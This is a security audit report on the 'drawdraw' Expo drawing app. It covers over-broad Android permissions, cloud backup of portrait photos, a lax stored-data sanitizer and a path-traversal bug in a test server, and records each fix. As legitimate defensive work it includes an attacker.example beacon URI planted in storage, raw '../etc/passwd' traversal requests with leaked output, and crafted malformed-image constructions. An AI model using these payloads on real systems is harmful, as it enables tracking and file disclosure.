# drawdraw — security audit (2026-09-11)

A dedicated security pass, separate from and later than the review in `REVIEW.md`. Specialist reviewers read the repository through a combined lens (L13), each required to *demonstrate* a finding rather than argue for it.

**4 findings** — 3 low, 1 info. Every one was reproduced with command output rather than argued from reading.

## Status

Every finding below was fixed on `claude/repo-review-security-baiyud` in e92f76a, each with a regression test that was checked by reverting the fix and confirming the test fails. The findings are kept as written so the reasoning behind each change stays with it.

## Findings

### L13-1 · low — The shipped Android build declares the whole media-read permission set (images, video, audio, legacy storage, overlay) for an app that only ever writes one PNG

`app.json`:14 · CWE-250 · reproduced

**Who.** Not a remote attacker: the beneficiary is any code that later runs inside the app's process — a compromised or malicious version of one of the 692 production dependencies, or a future code path — plus anyone who can talk a user into granting 'Photos and videos' from Settings. What they control is the app's own permission surface, which is decided entirely at build time and cannot be narrowed after install.

**How.** 1. Install the built APK. 2. The merged manifest contains READ_MEDIA_IMAGES, READ_MEDIA_VIDEO, READ_MEDIA_AUDIO, READ_MEDIA_VISUAL_USER_SELECTED, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE, SYSTEM_ALERT_WINDOW and INTERNET, none of which the first-party code ever requests or needs (EditorScreen.js:310 requests write-only, which on Android 13+ resolves to an empty permission array; HomeScreen.js:85-93 deliberately requests nothing for the picker). 3. Any code in the process can then call requestPermissionsAsync() without the granular writeOnly flag, or the user can toggle the permission on in Settings, and the entire photo, video and audio library becomes readable with no manifest change and no store resubmission. 4. SYSTEM_ALERT_WINDOW likewise lets any code in the process ask for the overlay permission the app has no use for.

**Why it matters.** A drawing app that never reads the media store ships asking for read access to every photo, video and audio file on the device, plus the 'display over other apps' permission and INTERNET (the app has no network code at all). The permissions are user-visible on the Play listing, they trigger Google Play's Photo and Video Permissions declaration policy, and they turn any future in-process code-execution or malicious-dependency problem from 'reads the app's own documents' into 'reads the whole camera roll and exfiltrates it'. The app.json plugin options that were added to minimise permissions (SEC-1/2/3 in REVIEW.md) only control the usage strings and the runtime request; they do not touch the permissions the module manifests merge in.

**Evidence.**

node_modules/expo-media-library/android/src/main/AndroidManifest.xml declares, unconditionally and independently of the plugin options in app.json:
  <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
  <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
  <uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />
  <uses-permission android:name="android.permission.READ_MEDIA_VISUAL_USER_SELECTED" />
  <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
  <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
The app's own generated manifest, from `npx expo config --type introspect --json`, carries INTERNET, SYSTEM_ALERT_WINDOW, VIBRATE, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE plus RECORD_AUDIO marked tools:node=remove, and android:requestLegacyExternalStorage="true". The three storage/overlay entries come from the real prebuild template (verified by unpacking expo-template-bare-minimum@53.0.42 from npm), whose own comment reads "OPTIONAL PERMISSIONS, REMOVE WHATEVER YOU DO NOT NEED".
@expo/config-plugins/build/android/Permissions.js:113-131 `setAndroidPermissions` only ever calls `addPermissionToManifest`; nothing removes a template or library permission. The single removal mechanism is `android.blockedPermissions` (Permissions.js:63-70 withInternalBlockedPermissions), which app.json does not use — RECORD_AUDIO is removed only because expo-image-picker's plugin calls withBlockedPermissions itself when microphonePermission is false (node_modules/expo-image-picker/plugin/build/withImagePicker.js:36-41).
__tests__/appConfig.test.js:1-6 states the exact rule this breaks ("an omission here becomes a permission in the shipped build that nothing in the app ever uses") but only asserts it for the microphone.

**Fix.** Add to app.json under `android`:
  "blockedPermissions": [
    "android.permission.READ_MEDIA_AUDIO",
    "android.permission.READ_MEDIA_VIDEO",
    "android.permission.READ_MEDIA_IMAGES",
    "android.permission.READ_MEDIA_VISUAL_USER_SELECTED",
    "android.permission.READ_EXTERNAL_STORAGE",
    "android.permission.SYSTEM_ALERT_WINDOW"
  ]
Keep WRITE_EXTERNAL_STORAGE: MediaLibraryModule.getManifestPermissions (android/src/main/java/expo/modules/medialibrary/MediaLibraryModule.kt:385-403) still requests it on Android 12 and below, which is the only runtime permission the save-to-Photos path needs. Then extend __tests__/appConfig.test.js to assert the blocked list covers every uses-permission declared by node_modules/expo-*/android/src/main/AndroidManifest.xml that is not on an allow-list of {CAMERA, VIBRATE, WRITE_EXTERNAL_STORAGE, INTERNET}, so a future module cannot quietly widen it again. INTERNET is needed by the dev client, so scope it to the debug manifest rather than blocking it outright if `expo start` still has to work.


### L13-2 · low — Expo's default flips the template's allowBackup to true, so the app's private copies of people's faces are enrolled in cloud backup and device transfer with no exclusion rules

`app.json`:14 · CWE-530 · reproduced

**Who.** Whoever can reach the victim's Google or Apple account backup (a restored device, a cloud-account compromise, a legal demand), and — on Android 11 and below — anyone with a few minutes of access to an unlocked device with USB debugging on, who can run `adb backup` and get the app's private files without root, precisely because allowBackup is true.

**How.** 1. The user imports or takes a portrait. storage.js:63-92 writes a full-resolution copy to `documentDirectory/portraits/<id>.<ext>` — on Android that is `context.filesDir` (expo-file-system/android/.../FileSystemModule.kt:93) and on iOS `NSDocumentDirectory` (expo-modules-core/ios/Core/AppContextConfig.swift:9). Both are included in the platform's automatic backup by default. 2. Nothing in the project sets `android.allowBackup`, so @expo/config-plugins' withAllowBackup writes android:allowBackup="true" over the bare template's "false". 3. No `android:dataExtractionRules` or `android:fullBackupContent` is supplied, so the whole filesDir tree plus the AsyncStorage database (the project index and the Pro entitlement flag) is in scope. 4. On iOS no file is ever marked with NSURLIsExcludedFromBackupKey, so the same copies go to iCloud. 5. The copies are then wherever the backup is, and land on any device that restores it.

**Why it matters.** Full-resolution photographs of identifiable faces leave the device silently. For a photo picked from the library this only duplicates an existing exposure, but `launchCameraAsync` (HomeScreen.js:104) does NOT write to the camera roll — the app's own copy under portraits/ is the only copy of that photo anywhere, and this default is what puts it in the user's cloud backup. The same backup carries `drawdraw.entitlements.v1` = {"pro":true}, so the paid unlock transfers with it. The app never tells the user any of this, and the only way to clear a portrait is a long-press delete per project.

**Evidence.**

@expo/config-plugins/build/android/AllowBackup.js:26-37
  function getAllowBackup(config) { return config.android?.allowBackup ?? true; }
  function setAllowBackup(config, androidManifest) { ... mainApplication.$['android:allowBackup'] = String(allowBackup); }
The real prebuild template ships the safe value — expo-template-bare-minimum@53.0.42, android/app/src/main/AndroidManifest.xml: `android:allowBackup="false"` — and the plugin overwrites it. Introspecting this project's own config yields:
  "android:allowBackup": "true", "android:requestLegacyExternalStorage": "true"
with no dataExtractionRules/fullBackupContent attribute anywhere in the generated manifest. grep across the tree finds no NSURLIsExcludedFromBackupKey and no backup rules file. src/lib/storage.js:19-23 shows the intent this contradicts: "a heavy user accumulates full-resolution copies of people's faces that nothing in the app can reach".

**Fix.** Decide it explicitly rather than inheriting it. Either (a) set `"android": { "allowBackup": false }` in app.json, which also closes the adb-backup extraction path on Android <= 11; or (b) keep backup for the index but exclude the pixels: ship an `android:dataExtractionRules`/`android:fullBackupContent` XML (via a small config plugin) that excludes `files/portraits/`, and on iOS set NSURLIsExcludedFromBackupKey on PORTRAIT_DIR after ensureDir() (storage.js:26-31). Whichever is chosen, say so in the README next to the permissions paragraph, since the app's whole privacy story is that it has no network and the copies therefore stay put.


### L13-3 · low — The stored-project sanitizer checks types but not domains, so the index still yields NaN/Infinity SVG geometry — and will make the app fetch an arbitrary remote URL

`src/lib/projectShape.js`:124 · CWE-20 · reproduced

**Who.** Anyone who can write the app's AsyncStorage: a rooted or jailbroken device, an `adb backup`/`adb restore` round-trip on an Android 11-or-below device (enabled by L13-2's allowBackup=true, no root needed), or anyone with the device when the web build is used. This is the trust boundary projectShape.js was added to be — its own header calls the index "written by this app — but by *some* build of it".

**How.** Route A (remote fetch): write a project record whose `image.uri` is `https://attacker.example/beacon.png?id=...`. sanitizeProject accepts any non-empty string (projectShape.js:124), and HomeScreen.js:155 renders it as `<Image source={{uri}}>` on every home-screen paint. The app, which otherwise makes no network requests of any kind, fetches the attacker's URL on launch — a per-launch beacon carrying the device IP, and on a shared image host, a read oracle. Route B (broken geometry): write `settings.headTransform.scale = 1e308` and `settings.proportions.width = 0`. sanitizeHeadTransform only rejects non-finite numbers and scale <= 0 (projectShape.js:41-47), and sanitizeProportions only requires finiteness (projectShape.js:55-66), so both pass; buildHeadWireframe then divides by A = BASE_A * 0 and HeadGuide multiplies by ppu = Infinity, and every path lands in the view as d="MNaN InfinityLNaN Infinity...".

**Why it matters.** Route A breaks the app's single strongest privacy property (it has no network code at all) from a data store, not from code. Route B is the exact failure REVIEW.md's BUG-8 fix was written to prevent, still reachable: on web the guide silently vanishes and the console fills with 57 rejected paths; on Android react-native-svg's PathParser throws IllegalArgumentException on a non-finite number (node_modules/react-native-svg/android/src/main/java/com/horcrux/svg/PathParser.java:663-668), so opening that project takes the editor down. It is recoverable — a long-press delete on the home screen still works — but only if the user guesses that.

**Evidence.**

src/lib/projectShape.js:120-135
  export function sanitizeProject(raw) {
    ...
    if (!isObject(image) || !isNonEmptyString(image.uri)) return null;
and :41-47
  function sanitizeHeadTransform(raw) {
    if (!isObject(raw)) return undefined;
    for (const key of TRANSFORM_KEYS) if (!isFinite_(raw[key])) return undefined;
    if (raw.scale <= 0) return undefined;
The module's own comment at projectShape.js:15-16 says "Nothing is invented and nothing is clamped: a value is either legitimate or it is not there" — but 1e308 and 0 are neither non-finite nor absent, and the file's opening comment names NaN path data as the thing it exists to stop. Meanwhile storage.js:35 already knows the real domain of image.uri (`!uri.startsWith(PORTRAIT_DIR)` guards deletion) and createProject only ever indexes a PORTRAIT_DIR path (storage.js:69-91), so the read path is strictly laxer than the invariant the write and delete paths keep.

Run against the real app in Chromium (web build in .web-build), seeding localStorage exactly as AsyncStorage does on web:
  Route A: requests the app made to the attacker URL: [ { "url": "/beacon.png?stolen=drawdraw", "referer": "http://127.0.0.1:44741/index.html" } ]
  Route B: editor opened: true | svg paths rendered: 57 | paths containing NaN/Infinity: 57 |
           sample: "MNaN InfinityLNaN InfinityLNaN InfinityLNaN InfinityLNaN Inf"
           page/console errors: 57 ['console: Error: <path> attribute d: Expected number, "MNaN InfinityLNaN…".', ...]
And against the pure modules directly:
  sanitizer ACCEPTED settings: {"headTransform":{...,"scale":1e+308},"proportions":{"width":0,...},"elements":{...}}
  contains NaN: true   contains Infinity: true

**Fix.** In sanitizeProject, hold image.uri to the invariant the rest of storage.js already keeps: accept it only if it starts with `file://` (better: require the PORTRAIT_DIR prefix, which is the only thing createProject ever writes) and drop the record otherwise — that also makes a stale non-durable record self-healing rather than a live fetch. In sanitizeHeadTransform and sanitizeProportions, range-check as well as type-check: scale within the same [0.1, 3] the pinch gesture clamps to (HeadGestureLayer.js:93), x/y within roughly [-2, 3], yaw/pitch/roll finite and normalised, and each proportion within the min/max the slider that writes it uses (EditorScreen.js:588-623) — dropping, not clamping, stays consistent with the module's stated contract. Cap hGuides/vGuides length while there. Add fixtures to src/lib/__tests__/projectShape.test.js for scale 1e308, width 0, and an http(s) image URI, and mutation-test them by reverting each check.


### L13-4 · info — The e2e test's static server still joins the raw request path, serving any file on the machine (REVIEW SEC-5, unfixed)

`e2e/smoke.mjs`:35 · CWE-22 · reproduced

**Who.** Any process that can open a TCP connection to 127.0.0.1 on the developer's machine or the CI runner during the ~30 seconds `npm run e2e` is running, and that does not already run as the same user — a container, another user's session, a sandboxed tool.

**How.** 1. `npm run e2e` starts the server on a random loopback port. 2. Connect and send a raw request line the browser would never send, e.g. `GET /../../../../etc/passwd HTTP/1.1` or its percent-encoded form `GET /%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1`. 3. node's path.join resolves the `..` segments, the existsSync/isFile check passes, and the file is streamed back with a 200.

**Why it matters.** Arbitrary read of any file the test user can read, for the life of the run — the project's own package.json, ~/.npmrc, an ssh key. Bounded hard by the loopback bind, the random port, the short window, and the fact that a same-user local process could read those files anyway; that is why this stays info rather than higher. It was reported as SEC-5 in the previous review, is not in that review's fixed list, and is still present verbatim.

**Evidence.**

e2e/smoke.mjs:34-39
  const server = createServer((req, res) => {
    const path = join(BUILD, decodeURIComponent(req.url.split('?')[0]));
    const file = existsSync(path) && statSync(path).isFile() ? path : join(BUILD, 'index.html');
    res.writeHead(200, { 'Content-Type': TYPES[extname(file)] || 'application/octet-stream' });
    createReadStream(file).pipe(res);
  });
Running that handler verbatim against the real .web-build and speaking raw HTTP to it:
  REQUEST /../../../../etc/hostname          -> HTTP/1.1 200 OK  body="vm\n"
  REQUEST /%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd -> HTTP/1.1 200 OK  body="root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:..."
  REQUEST /../package.json                   -> HTTP/1.1 200 OK  body="{\n  \"name\": \"drawdraw\",..."
Note the percent-encoded form works too, so decoding before resolving is part of the bug.

**Fix.** Resolve and contain: `const resolved = resolve(BUILD, '.' + normalize(decodeURIComponent(req.url.split('?')[0]))); const inside = resolved === BUILD || resolved.startsWith(BUILD + sep); const file = inside && existsSync(resolved) && statSync(resolved).isFile() ? resolved : join(BUILD, 'index.html');` — the SPA fallback to index.html already makes refusing the request indistinguishable from the current behaviour for every legitimate path the smoke test uses.


## Checked and sound

What the reviewers tried and could not break. Recorded so it is not re-raised, and so a future change that undoes one of these is recognisable as a regression.

- npm audit HIGH 1/7 — image-size 1.2.1 (GHSA-w3rx-r6r6-pgpr ICNS infinite loop, GHSA-5p2g-fcmc-qvqq JXL/HEIF infinite loops): NOT reachable in a shipped build, and not reached by this repo's builds today either. Its only call site anywhere in the tree is metro/src/Assets.js:6,29 `getImageSize(content)` inside getAssetSize, which runs on the developer/CI machine when metro serialises an image asset. `npx expo export --platform ios` on this project emits metadata.json with "assets":[] — no JS file requires an image (grep for require(.*\.png) across App.js/index.js/src/e2e/tools returns nothing; the four assets/*.png are consumed by the icon/splash config plugins, not by metro), so image-size is never invoked. Two caveats worth writing down: (a) metro's isAssetTypeAnImage gate is on the file EXTENSION but image-size sniffs the CONTENT (image-size/dist/index.js:26 "detect the file type.. don't rely on the extension"), so a file named .png whose bytes start with 'icns' does reach the vulnerable parser — I confirmed the 32-byte file `icns` + length 0xffffff + entry 'ic08' + entry-length 0 spins image-size for 72.8s before it dies with RangeError: Invalid array length (icns.js:91 never advances imageOffset while pushing to result.images); dropping that file into assets/ and requiring it made `expo export` fail after 64s with "SyntaxError: assets/evil.png: Invalid array length". (b) that path opens the moment anyone adds a require()d image, so the exposure is latent rather than absent. Nothing about it can reach a user's phone.
- npm audit HIGH 2/7 — postcss 8.4.49 (GHSA-r28c-9q8g-f849 and GHSA-6g55-p6wh-862q arbitrary .map file disclosure via attacker-controlled sourceMappingURL, GHSA-fxqj-rqcc-2cmp, GHSA-qx2v-qp2m-jg93): NOT reachable at all, in a shipped build or in this toolchain. It sits under @expo/metro-config and is `require`d at exactly one place, transform-worker/postcss.js:45, behind three gates in transform-worker.js:177-191 — the module must be a .css file, the platform must be 'web', and resolvePostcssConfig must find a postcss.config.{js,json} in the project. This repo has no CSS file tracked (git ls-files finds none) and no postcss config, so the require never executes even during `expo export --platform web`. The advisories additionally need attacker-authored CSS, which would have to be committed here.
- npm audit HIGH 3/7 — metro 0.82.5: flagged only by inheritance (its `via` list is image-size, metro-config, metro-transform-worker; it carries no advisory of its own). Bundler, dev/CI machine only; grep of the shipped 2.17 MB Hermes bundle for "metro-transform" returns 0. Same answer as image-size.
- npm audit HIGH 4/7 — metro-config 0.82.5: inherited from metro, no advisory of its own, build-time only, absent from the shipped bundle.
- npm audit HIGH 5/7 — metro-transform-worker 0.82.5: inherited from metro, no advisory of its own. This is the package that owns assetTransformer.js, i.e. the route to image-size, so its reachability is exactly the image-size answer: build-time only, and currently not even that, because the app bundles zero assets.
- npm audit HIGH 6/7 — @react-native/community-cli-plugin 0.79.6: inherited from metro/metro-config. It is the react-native CLI's dev-server plugin (`react-native start`), it is not part of the runtime, and "community-cli-plugin" does not appear anywhere in the shipped bundle. Not reachable in a shipped build.
- npm audit HIGH 7/7 — react-native 0.79.6: this is the one most likely to be misread. It is flagged high only because it depends on @react-native/community-cli-plugin, which depends on metro, which depends on image-size. There is no advisory against the React Native runtime that ships in the iOS/Android binary. Verified directly: `npx expo export --platform ios` produced one 2.17 MB Hermes file and metadata.json, and grepping the bytecode for postcss / image-size / metro-transform / community-cli-plugin / sourceMappingURL / icns returns 0 for each while app strings (drawdraw.projects.v1, "Fit to face", portraits/) return 1 each, so the grep is meaningful. Summary for all seven: every one of them lives in the bundler/CLI chain, none of them ships to a user, and the worst case on a developer or CI machine is a 60-70 second stall and a failed build from a crafted image asset that someone would have to commit first.
- REVIEW.md SUP-1's claim that "this app feeds user-chosen photos through the bundler's image tooling in dev" is wrong, and worth correcting in place: user photos are read on the phone at runtime by expo-image-picker; metro only ever sees files committed to the repository. It does not change SUP-1's conclusion.
- Nearly reported that the shipped iOS app disables App Transport Security: `npx expo config --type introspect` prints NSAppTransportSecurity: { NSAllowsArbitraryLoads: true } for this project. It is an artifact of the in-memory fallback template at @expo/config-plugins/build/plugins/withIosBaseMods.js:130, used only when no ios/ directory exists. The real template that prebuild copies — expo-template-bare-minimum@53.0.42, ios/<app>/Info.plist:29-35 — has NSAllowsArbitraryLoads=false with NSAllowsLocalNetworking=true, which is correct. Anyone auditing a managed Expo app from introspection output should check the template before believing that key. (The Android half of the same introspection IS trustworthy: the fallback manifest string and the real template's AndroidManifest.xml are identical, which is how L13-1 and L13-2 were confirmed.)
- Photo import path: launchImageLibraryAsync is called with {mediaTypes:['images'], quality:1} and no exif/base64/allowsEditing, and app.json sets isAccessMediaLocationEnabled:false, so no EXIF and no GPS ever reaches JS. No library permission is requested for the picker (HomeScreen.js:80-93), which is correct — PHPickerViewController/PickVisualMedia run out of process. The destination path is entirely app-generated (`${PORTRAIT_DIR}${id}.${portraitExtension(asset.uri)}`, storage.js:69) with id = p<base36 time>, and portraitExtension (filenames.js) strips query/fragment, takes only the last path segment and holds the result to a nine-entry allow-list — I tried content:// URIs, dotfiles, `..%2f`, a trailing dot and a non-string and could not get anything but a bare allow-listed extension or 'jpg' out of it.
- deleteProject/removePortrait: `if (typeof uri !== 'string' || !uri.startsWith(PORTRAIT_DIR)) return;` (storage.js:35). I tried to get a traversing URI into the index to abuse it — createProject only ever indexes an app-generated PORTRAIT_DIR path, and the ephemeral (copy-failed) project is deliberately not written to the index at all (storage.js:84), so within the app's own writes the guard is unreachable-by-design rather than load-bearing. It becomes load-bearing only for a tampered index, which is the gap L13-3 covers; note `${PORTRAIT_DIR}../..` would pass a startsWith check, so if the sanitizer starts enforcing the prefix it should reject '..' segments too.
- What an exported file discloses: captureRef writes a PNG through UIImagePNGRepresentation on iOS and Bitmap.compress on Android, neither of which emits EXIF, and the source pixels came from an Image view rather than the original file, so no camera metadata, GPS or original filename survives into the export. The temp file is now released on every branch of the export alert including Android's onDismiss (EditorScreen.js:290-347), so nothing is left in the cache. The tracing-layer export is the portrait at 5-85% alpha on transparency — the original pixels are recoverable from it by dividing out the alpha, but the app describes it as exactly that ("the photo faded back as a tracing layer") and makes no anonymity claim, so it is not a defect.
- Purchase verification: purchase() and restore() both grant only on `result?.pro` (pro.js:69-86), so the unlock-on-cancel seam flagged as SEC-4 is genuinely closed and the comment now matches the code; the bundled provider throws with code 'not_configured' on both calls, so no local flow grants anything today. The remaining property — the entitlement is a plaintext {"pro":true} in AsyncStorage with no receipt and no server — is unchanged, deliberate, and documented at purchases.js:25-29; I found no new way to reach grant() (it is called only from those two places, both behind the result check) and nothing else in the app writes that key. Worth noting the flag rides along in the device backup covered by L13-2.
- Pro gating of content: activeElements filters every el.pro key out for a free user before the wireframe is built (EditorScreen.js:101-112), buildHeadWireframe treats the element set as authoritative and never merges defaults back in (headModel.js:352-354), sanitizeElements only ever removes keys and explicitly refuses to complete the set (projectShape.js:73-79), and the turnaround off-screen view is mounted only when `pro` (EditorScreen.js:742). I tried to get a Pro line into a free export by seeding a stored settings blob with every element true: the sanitizer passes them through (correctly — they are legitimate values) and the Pro filter strips them at render time, so both the screen and all four export surfaces come back free-tier.
- Prototype pollution in the storage path: sanitizeElements iterates ELEMENT_KEYS and sanitizeProportions iterates Object.keys(DEFAULT_PROPORTIONS), both writing into a fresh object literal, so stored keys named __proto__, constructor or prototype are simply not copied; buildHeadWireframe then reads fixed property names that do not exist on Object.prototype. JSON.parse's own __proto__ handling is not exploitable here because nothing merges the parsed object into anything.
- Exported Android components and IPC: every FileProvider in the dependency tree (expo-file-system, expo-image-picker, expo-sharing) is android:exported="false" with grantUriPermissions, the only exported component is MainActivity with a plain MAIN/LAUNCHER filter, and there is no deep-link handler anywhere — app.json declares no `scheme`, nothing imports Linking, and there is no WebView. The iOS build does register CFBundleURLSchemes ['com.platteration.drawdraw'] for the dev client, but no code reads an incoming URL, so a scheme collision achieves nothing beyond launching the app.
- Cleartext traffic: nothing in the generated Android manifest sets android:usesCleartextTraffic, so it defaults to false for targetSdk >= 28, and the real iOS template keeps NSAllowsArbitraryLoads false. Combined with the fact that the first-party source makes no network request of any kind (no fetch/XHR/WebSocket/Linking/WebView), the only way to make this app talk to the network is L13-3's stored image URI.
- CI: the workflow pins both actions to commit SHAs, declares permissions: contents: read, runs on node 22 with `npm ci` against a lockfileVersion 3 lockfile, and holds no secrets, so a fork PR cannot reach a token. playwright is now 1.63.0, past the 1.55.1 that fixes GHSA-7mvr-c777-76hp, so SUP-2 is genuinely closed. The residual is that `npx playwright install --with-deps chromium` still fetches and executes a browser build on every run, which is inherent to the job.
- tools/png.mjs decodePng reads width/height straight out of IHDR and does Buffer.alloc(height * width * 4) with no bound, and inflateSync's output is uncapped, so a hostile assets/*.png in a pull request makes `npm run icons:check` allocate gigabytes. I built one (40000x40000 header, 200 MB inflate, 204 KB on disk) and ran it through the real decodePng: it throws RangeError from Buffer.copy rather than hanging, and the job it runs in was going to fail the pixel comparison anyway, so the difference between the fixed and broken cases is a crash instead of an assertion. Real sloppiness, no impact worth a finding; a `if (width*height > 4096*4096) throw` and a maxOutputLength on inflateSync would close it if anyone touches the file.

